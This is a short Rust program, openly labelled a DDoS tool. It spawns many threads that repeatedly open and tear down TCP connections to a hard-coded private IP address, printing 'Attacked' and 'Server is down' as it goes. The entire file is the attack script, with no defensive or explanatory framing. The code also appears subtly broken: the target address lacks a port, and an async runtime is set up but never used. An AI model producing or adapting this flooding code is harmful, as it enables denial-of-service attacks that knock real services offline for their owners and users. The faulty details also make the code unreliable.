
use std::env;
use std::{thread};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;

use std::net::TcpStream;
use std::io::Write;

static URL: &str = "10.41.47.254";

extern crate ctrlc;

#[tokio::main]
async fn main()
{
    // setup
    let is_running = Arc::new(AtomicBool::new(true));
    let args: Vec<String> = env::args().collect();
    let number_of_threads = get_number_of_threads(args);
    println!("Ddos is started");

    let is_running_handler = is_running.clone();
    ctrlc::set_handler(move|| {
        is_running_handler.store(false, Ordering::SeqCst);
        println!("Received Ctrl-C!");
        println!("Ddos is Ended");

    }).expect("Error setting Ctrl-C handler");
    
    // loop{
        
    //     let is_running_handler = is_running.clone();
    //     _req(is_running_handler);
    // }

    let mut threads = Vec::new();
    for _i in 0..number_of_threads
    {
        let is_running_handler = is_running.clone();
        let handle = thread::spawn(move || {
            _req(is_running_handler);
        });
        threads.push(handle)
    }
    for handle in threads
    {
        handle.join().unwrap();
    }
}   


fn get_number_of_threads(args:Vec<String>) -> i32
{
    if args.len()<=1
    {
        return 1
    }
    let query: &String = &args[1];
    return query.parse::<i32>().unwrap();
}

fn _req(is_running:Arc<AtomicBool>)
{   
    println!("Pinged, {}", URL);
    if let Ok(mut stream) = TcpStream::connect(URL)
    {
        let _ = stream.set_nodelay(true);
        println!("Attacked");

        while is_running.load(Ordering::SeqCst)
        {
            stream.shutdown(std::net::Shutdown::Both).unwrap();
            match TcpStream::connect(URL)
            {
                Ok(res) => {
                    stream = res;
                    stream.set_nodelay(true);
                    println!("Attacked");
                },
                Err(_) => println!("Server is down"),
            }
        }
    }

}
